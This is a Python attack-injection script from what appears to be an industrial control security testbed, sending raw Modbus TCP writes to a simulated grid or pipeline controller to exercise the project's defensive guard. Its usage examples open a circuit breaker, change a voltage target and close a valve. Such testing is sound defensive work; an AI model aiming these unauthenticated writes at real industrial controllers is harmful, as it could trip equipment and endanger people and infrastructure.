"""Send a protocol-valid Modbus TCP write straight to the simulated controller.

    python -m sentinel.attacks.modbus_inject coil 0 0          # grid: open CB-101
    python -m sentinel.attacks.modbus_inject register 1 1180   # grid: AVC target 11.80 kV
    python -m sentinel.attacks.modbus_inject --port 5021 coil 1 0   # pipeline: close MOV-201
    python -m sentinel.attacks.modbus_inject --port 5020 read        # mirror of live telemetry

No MQTT, no Sentinel API: this is the attacker's path.  The controller obeys,
and the guard evaluates the write like any other command.
"""
from __future__ import annotations

import argparse

from ..plant.modbus import read_inputs, write


def main() -> int:
    parser = argparse.ArgumentParser(description="Sentinel Modbus TCP injection")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5020)
    parser.add_argument("kind", choices=["coil", "register", "read"])
    parser.add_argument("address", type=int, nargs="?", default=0)
    parser.add_argument("value", type=int, nargs="?", default=0)
    args = parser.parse_args()
    if args.kind == "read":
        regs = read_inputs(args.host, args.port, 0, 8)
        print("input registers 0-7:", regs)
        return 0
    ok = write(args.host, args.port, args.kind, args.address, args.value)
    print(f"{args.kind} {args.address} <- {args.value}: {'accepted' if ok else 'rejected'}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
